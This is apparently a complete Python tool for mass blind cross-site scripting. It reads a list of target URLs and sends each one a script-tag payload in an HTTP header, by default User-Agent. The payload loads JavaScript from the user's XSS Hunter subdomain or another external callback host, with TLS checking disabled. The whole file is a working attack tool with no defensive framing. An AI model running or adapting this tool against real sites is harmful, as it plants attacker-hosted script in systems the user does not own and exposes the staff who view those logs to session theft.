import requests , optparse , concurrent.futures , urllib3
from os import path

def PayloadsStripper(Payload , Strip):
    if Strip == None or Strip == '':
        Strip = ","

    if Strip in Payload:
        # There's something to split
        Payloads = Payload.split(Strip)
    else:
        Payloads = Payload

    return Payloads

def Validation(Options):
    # Main Config For `Main`
    Config = {
        "file":"",
        "xsshunter":"",
        "bin":"",
        "mode":"",
        "payload":"",
        "redirection":"",
        "header":"",
        "replace":""
    }

    # File Validation
    if Options.file != None:
        if path.exists(Options.file):
            Config["file"] = Options.file
        else:
            print("The file you selected: {0}. doesn't exists".format(Options.file)); exit()
    else:
        print("You didn't select a file to use with the tool."); exit()

    # XSSHunter And Bin Validation 
    if Options.username != None:
        if Options.bin != None:
            print("You can't use both XSSHunter and ExternalBin."); exit()
        else:
            XSSHunter = "{0}.xss.ht".format(Options.username)
            Config["xsshunter"] = XSSHunter
    else:
        if Options.bin == None:
            print("Please use your XSSHunter username or use an ExternalBin"); exit()
        else:
            Config["bin"] = Options.bin

    # Replace Validation Before Payload.
    if Options.replace != None:
        Config["replace"] = Options.replace
    else:
        Config["replace"] = "XXX" 

    # Payload Validation
    if Options.payload != None:
        # The User Selected a Payload
        if Config["replace"] not in Options.payload:
            print("You didn't add the replace string. use 'XXX' with your payload to replace it with the XSSHunter/Bin"); exit()
        else:
            Config["payload"] = Options.payload
    else:
        Config["payload"] = f'"><script src={Config["replace"]}></script>'

    # Redirection Validation
    if Options.redirect != None:
        if Options.redirect == "allow" or Options.redirect == "deny":
            pass
        else:
            print("You didn't select any valid mode for redirection. the only valid mode is `allow` and `deny`"); exit()
    else:
        Config["redirect"] = "allow"

    if Options.header != None:
        Config["header"] = Options.header
    else:
        Config["header"] = "User-Agent"

    return Config

def Sender(URL , Redirect , Payload , Hunter , Header , Replace):
    Payload = Payload.replace(Replace , Hunter)

    try:
        if Redirect == "allow":
            Response = requests.get(URL , verify=False , timeout=5 , headers={Header:Payload} , allow_redirects=True)
            print("\rRequest Has Been Sent To: {0}, Status-Code: {1} , Payload: {2}".format(URL , str(Response.status_code) , Payload))
        else:
            Response = requests.get(URL , verify=False , timeout=5 , headers={Header:Payload} , allow_redirects=False)
            print("Request Has Been Sent To: {0}, Status-Code: {1} , Payload: {2}".format(URL , str(Response.status_code) , Payload))
    except Exception:
        print("Can't Request This URL: {0}".format(URL))

def CollectOptions():
    Parser = optparse.OptionParser()
    Parser.add_option("-f" , "--file" , dest="file" , help="The Hosts File You Want To Use")
    Parser.add_option("-u" , "--username" , dest="username" , help="Your XSSHunter Username")
    Parser.add_option("-p" , "--payload" , dest="payload" , help="The Payload You Want To Use Instead Of The Default One")
    Parser.add_option("-b" , "--bin" , dest="bin" , help="Your External Bin You Want To Use To Detect If The Payload Is Fired")
    Parser.add_option("-r" , "--redirections" , dest="redirect" , help="Redirection Mode To Allow/Disallow Them")
    Parser.add_option("-s" , "--strip" , dest="strip" , help="The Payload Seprator To Split Them.")
    Parser.add_option("--replace" , dest="replace" , help="The String Used To Replace It With The Host")
    Parser.add_option("--header" , dest="header" , help="The Header You Want The Blind Payload To Be Added On.")

    Options , _ = Parser.parse_args()
    return Options

def Main(Options):
    with concurrent.futures.ThreadPoolExecutor() as Validate:
        Config = Validate.submit(Validation , Options)
        Config = Config.result()

    if Config["bin"] == '':
        Hunter = "https://" + Config["xsshunter"] + "/"
    else:
        Hunter = Config["bin"]

    Payloads = PayloadsStripper(Config["payload"] , Options.strip)

    if type(Payloads) == list:
        # There's more than one
        _mode = 0
    else:
        _mode = 1

    URLs = open(Config["file"] , 'r')
    for URL in URLs:
        URL = URL.rstrip("\n")

        if _mode == 1:
            Sender(URL=URL , Redirect=Config["redirection"] , Payload=Config["payload"] , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
        elif _mode == 0:
            for SinglePayload in Payloads:
                Sender(URL=URL , Redirect=Config["redirection"] , Payload=SinglePayload , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
        else:
            pass

if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    with concurrent.futures.ThreadPoolExecutor() as OptionsCollector:
        Options = OptionsCollector.submit(CollectOptions)
        Options = Options.result()

    with concurrent.futures.ThreadPoolExecutor() as Threader:
        _ = Threader.submit(Main , Options)
